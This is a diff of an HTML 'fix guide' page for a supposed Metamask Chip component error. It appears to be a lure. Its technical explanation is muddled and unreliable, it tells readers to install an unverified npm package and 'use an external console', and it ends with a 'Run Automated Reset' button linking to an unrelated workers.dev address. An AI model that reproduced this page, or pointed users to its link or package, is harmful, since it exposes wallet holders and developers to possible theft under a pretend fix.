@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0f111a;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -45,29 +45,24 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the Chip component is no longer supported in the latest version of the component-library, and the Metamask extension is still using the outdated component.</li>
+<li>The error occurs because the Chip component is no longer supported and has been superseded by the Tag component, which provides more flexibility and customization options.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>Update the import statement to use the Tag component instead of Chip: </li>
 <li>Replace <code>import { Chip } from '@material-ui/core';</code> with <code>import { Tag } from '@component-library/tag';</code></li>
-<li>Update the component usage to match the new Tag component API</li>
-<li>Verify that all dependencies are up-to-date and compatible with the new component-library version</li>
+<li>Update the component usage to use the Tag component: </li>
+<li>Use the following code to override the deprecated component:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;dependencies&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;@component-library/tag&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;^1.2.3&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;@material-ui/core&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;^4.12.3&quot;</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@component-library/tag
 </code></pre></div>
 
-<p>Consider utilizing an external console to verify the changes and test the updated component.</p>
+<p>Consider using an external console to verify the installation of the new package.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Node.js version 16 or higher</li>
-<li>Yarn or npm package manager</li>
-<li>Latest version of the component-library installed</li>
+<li>Node.js installed on the system</li>
+<li>npm package manager installed</li>
+<li>Metamask extension source code accessible for editing</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
